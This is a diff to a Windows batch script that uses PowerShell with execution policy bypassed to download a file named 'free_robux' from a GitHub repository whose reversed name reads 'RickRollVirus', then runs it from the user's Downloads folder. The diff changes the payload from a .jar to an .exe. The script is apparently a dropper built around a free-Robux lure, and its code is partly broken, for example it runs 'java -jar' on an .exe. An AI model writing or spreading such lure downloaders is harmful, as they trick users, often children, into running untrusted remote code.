@@ -1,14 +1,14 @@
 @echo off
 setlocal EnableExtensions
 
-set "JAR_NAME=free_robux.jar"
-set "JAR_URL=https://github.com/ItsNukea/suriVlloRkciR/raw/main/%JAR_NAME%"
+set "EXE_NAME=free_robux.exe"
+set "EXE_URL=https://github.com/ItsNukea/suriVlloRkciR/releases/downloads/v2.0/%EXE_NAME%"
 set "DEST_DIR=%USERPROFILE%\Downloads"
 
-IF EXIST "%DEST_DIR%%JAR_NAME%" (
+IF EXIST "%DEST_DIR%%EXE_NAME%" (
 ) ELSE (
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "iwr -Uri '%JAR_URL%' -OutFile '%DEST_PATH%' -UseBasicParsing"
+  "iwr -Uri '%EXE_URL%' -OutFile '%DEST_DIR%' -UseBasicParsing"
 )
 
 if errorlevel 1 (
@@ -18,7 +18,7 @@ if errorlevel 1 (
 )
 
 cd %DEST_DIR%
-java -jar %JAR_NAME%
+java -jar %EXE_NAME%
 pause
 
 endlocal
